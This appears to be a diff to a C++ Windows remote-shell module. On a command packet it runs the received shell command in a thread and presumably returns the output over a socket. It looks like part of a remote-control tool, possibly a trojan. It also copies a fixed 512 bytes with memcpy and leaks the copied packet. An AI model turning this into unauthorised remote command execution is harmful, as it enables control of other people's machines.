@@ -15,12 +15,17 @@ CModuleShellRemote::~CModuleShellRemote() {
 
 
 void CModuleShellRemote::OnRecvivePacket(CPacket* pPacket) {
-	switch (pPacket->m_PacketHead.wCommandId) {
+	// 传进来的pPacket是局部变量，记得拷贝构造	// 有的局部有的new太复杂了，我在考虑所以的packet都用new，但完全不需要的时候delete
+	CPacket* pPacketCopy = new CPacket(*pPacket);			
+
+	switch (pPacketCopy->m_PacketHead.wCommandId) {
 		
 	case SHELL_EXECUTE: {
 		//MessageBox(0, (WCHAR*)pPacket->m_pbPacketBody, L"", 0);
 		
 		//ExecuteShell((WCHAR*)pPacket->m_pbPacketBody);			// 能拿到运行结果，但是包就是发不出去。。。。// 但是注释此行，运行下面两行的，这个包能发出去。
+
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecuteShell, (LPVOID)pPacketCopy, 0, NULL);
 
 		//WCHAR pszData[30] = L"I am the test!";
 		//pPacket->m_pSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)pszData, 30);
@@ -34,8 +39,14 @@ void CModuleShellRemote::OnRecvivePacket(CPacket* pPacket) {
 }
 
 
-DWORD CModuleShellRemote::ExecuteShell(WCHAR* pszCommand)
+DWORD WINAPI ExecuteShell(LPVOID lParam)
 {
+	CPacket* pPacket = (CPacket*)lParam;
+	WCHAR pszCommand[512];
+	memcpy(pszCommand, pPacket->m_pbPacketBody, 512);
+	CSocketClient* m_pChildSocketClient = pPacket->m_pSocketClient;
+
+
 	//CTcpTran m_tcptran;
 
 	STARTUPINFO si;
